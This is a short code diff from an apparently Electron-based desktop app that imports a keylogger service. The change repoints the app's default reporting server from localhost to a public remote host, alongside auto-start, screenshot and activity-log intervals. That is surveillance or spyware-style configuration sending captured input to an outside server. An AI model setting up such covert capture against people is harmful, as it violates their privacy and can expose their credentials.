@@ -20,7 +20,7 @@ import { KeyloggerService } from './services/keylogger-service';
 // Configuration store
 const store = new Store({
   defaults: {
-    serverUrl: 'http://localhost:4000',
+    serverUrl: 'https://netwatch-el87.onrender.com',
     autoStart: true,
     screenshotInterval: 5000,
     activityLogInterval: 10000,
